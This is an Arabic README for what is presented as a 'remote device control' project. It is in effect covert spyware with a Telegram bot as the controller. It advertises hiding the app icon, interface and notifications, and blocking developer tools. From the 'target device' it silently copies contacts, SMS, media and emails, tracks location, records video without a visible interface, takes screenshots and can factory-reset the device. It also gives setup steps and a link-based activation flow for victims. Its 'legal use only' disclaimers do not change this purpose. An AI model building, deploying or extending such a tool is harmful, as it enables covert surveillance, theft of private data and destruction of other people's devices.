# نظام التحكم عن بعد في الأجهزة

## نظرة عامة

نظام متكامل للتحكم عن بعد في الأجهزة مع ميزات متقدمة للأمان والتخفي. يتضمن واجهة ويب، خادم أوامر، بوت تيليجرام، ووحدات تحكم في الأجهزة.

## الميزات الرئيسية

### 🔒 الأمان والتخفي
- تشفير AES-256-CBC لجميع البيانات
- إخفاء كامل للواجهة والإشعارات
- عمل في الخلفية بدون إشعارات
- منع فتح أدوات المطور
- حماية من هجمات DDoS

### 🌐 استمرارية العمليات
- **استمرار العمليات حتى عند انقطاع الإنترنت في الجهاز المستهدف**
- **استمرار العمليات حتى عند انقطاع الإنترنت في الجهاز الرئيسي**
- نظام تخزين محلي للبيانات والأوامر
- إعادة الاتصال التلقائي
- معالجة الأوامر المعلقة عند عودة الاتصال
- Service Worker للعمل في الخلفية
- Local Storage و IndexedDB للتخزين المحلي

### 📱 التحكم في الأجهزة
- نسخ جهات الاتصال والرسائل
- نسخ الوسائط والإيميلات
- الحصول على الموقع الحالي
- تسجيل الفيديو بدون واجهة
- لقطات شاشة
- إعادة ضبط المصنع
- مراقبة التطبيقات النشطة

### 🤖 بوت تيليجرام
- واجهة سهلة الاستخدام
- أوامر متقدمة
- تقييد الاستخدام للمالك فقط
- معالجة الأوامر المعلقة
- إحصائيات مفصلة

## هيكل المشروع

```
remote-control-system/
├── web-interface/          # واجهة الويب
│   ├── public/
│   │   ├── index.html
│   │   ├── activate.js     # كود التفعيل المحسن
│   │   └── sw.js          # Service Worker
│   ├── server.js
│   └── package.json
├── command-server/         # خادم الأوامر
│   ├── server.js          # خادم محسن مع التخزين المحلي
│   └── package.json
├── device-scripts/         # سكريبتات الجهاز
│   ├── main-controller.js  # وحدة تحكم محسنة
│   ├── permission-granter.js
│   ├── backup-module.js
│   ├── camera-module.js
│   ├── system-module.js
│   └── package.json
├── telegram-bot/           # بوت تيليجرام
│   ├── bot.py             # بوت محسن مع التخزين المحلي
│   └── requirements.txt
├── database/              # قاعدة البيانات
│   └── devices.db
├── start.sh              # سكريبت التشغيل
├── stop.sh               # سكريبت الإيقاف
├── README.md
├── CONFIGURATION.md
└── PROJECT_SUMMARY.md
```

## التثبيت والتشغيل

### المتطلبات
- Node.js 16+
- Python 3.8+
- npm
- pip3

### التثبيت السريع
```bash
# استنساخ المشروع
git clone <repository-url>
cd remote-control-system

# تشغيل النظام
chmod +x start.sh stop.sh
./start.sh
```

### التثبيت اليدوي
```bash
# 1. تثبيت تبعيات واجهة الويب
cd web-interface
npm install

# 2. تثبيت تبعيات خادم الأوامر
cd ../command-server
npm install

# 3. تثبيت تبعيات سكريبتات الجهاز
cd ../device-scripts
npm install

# 4. تثبيت تبعيات بوت تيليجرام
cd ../telegram-bot
pip3 install -r requirements.txt

# 5. تشغيل المكونات
cd ../web-interface && npm start &
cd ../command-server && npm start &
cd ../telegram-bot && python3 bot.py &
```

## الاستخدام

### 1. ربط جهاز جديد
1. افتح البوت في تيليجرام
2. استخدم الأمر `/link`
3. افتح الرابط على الجهاز المستهدف
4. أدخل كود التفعيل
5. انتظر تأكيد الربط

### 2. التحكم في الأجهزة
- `/devices` - عرض الأجهزة المرتبطة
- `/contacts` - نسخ جهات الاتصال
- `/sms` - نسخ الرسائل النصية
- `/media` - نسخ الوسائط
- `/location` - الحصول على الموقع
- `/record` - تسجيل الفيديو
- `/screenshot` - لقطة شاشة
- `/reset` - إعادة ضبط المصنع

## الميزات المتقدمة

### استمرارية العمليات
- **التخزين المحلي**: جميع البيانات والأوامر تُحفظ محلياً
- **إعادة الاتصال التلقائي**: محاولات متعددة للاتصال
- **معالجة الأوامر المعلقة**: تنفيذ الأوامر عند عودة الاتصال
- **Service Worker**: استمرار العمليات في الخلفية
- **Local Storage**: حفظ البيانات في المتصفح
- **IndexedDB**: قاعدة بيانات محلية متقدمة

### الأمان
- تشفير جميع البيانات
- إخفاء كامل للواجهة
- منع الإشعارات
- حماية من هجمات DDoS
- تقييد الاستخدام للمالك فقط

### المراقبة
- مراقبة الموقع كل 5 دقائق
- مراقبة التطبيقات النشطة كل دقيقة
- فحص الاتصال بالإنترنت
- إرسال نبض الحياة كل 30 ثانية

## الإعدادات

### إعداد بوت تيليجرام
1. إنشاء بوت جديد عبر @BotFather
2. الحصول على التوكن
3. تحديث `BOT_TOKEN` في `telegram-bot/bot.py`
4. تحديث `OWNER_USER_ID` بمعرف المستخدم

### إعداد الخوادم
- تعديل عناوين الخوادم في الملفات
- إعداد شهادات SSL للاتصالات الآمنة
- تكوين الجدران النارية

## الأمان والخصوصية

### ميزات الأمان
- تشفير AES-256-CBC
- HMAC للتحقق من سلامة البيانات
- Rate Limiting
- حماية من SQL Injection
- حماية من XSS
- إخفاء كامل للواجهة

### التخفي
- عمل في الخلفية بدون إشعارات
- إخفاء أيقونة التطبيق
- تعطيل الإشعارات
- منع فتح أدوات المطور
- تشفير جميع الاتصالات

## استكشاف الأخطاء

### مشاكل الاتصال
1. تأكد من تشغيل جميع الخوادم
2. تحقق من إعدادات الجدار الناري
3. تأكد من صحة عناوين الخوادم

### مشاكل التفعيل
1. تأكد من منح الصلاحيات المطلوبة
2. تحقق من تفعيل خيارات المطور
3. تأكد من وجود اتصال بالإنترنت

### مشاكل البوت
1. تحقق من صحة توكن البوت
2. تأكد من إضافة المستخدم للمصرح لهم
3. تحقق من سجلات الأخطاء

## الصيانة

### التنظيف الدوري
- حذف البيانات القديمة (أكثر من 7 أيام)
- تنظيف الأجهزة غير النشطة
- مراجعة سجلات الأخطاء

### النسخ الاحتياطي
- نسخ قاعدة البيانات بانتظام
- حفظ ملفات التكوين
- نسخ البيانات المحلية

## التحذيرات

⚠️ **تحذير مهم**: هذا النظام مخصص للاستخدام القانوني فقط. يتحمل المستخدم المسؤولية الكاملة عن استخدامه.

## الترخيص

هذا المشروع مرخص تحت رخصة MIT.

## المساهمة

نرحب بالمساهمات! يرجى قراءة دليل المساهمة قبل إرسال Pull Request.

## الدعم

للحصول على الدعم، يرجى فتح Issue في المستودع أو التواصل عبر البريد الإلكتروني.

---

**ملاحظة**: هذا النظام مصمم للاستخدام القانوني والأخلاقي فقط. يتحمل المستخدم المسؤولية الكاملة عن استخدامه.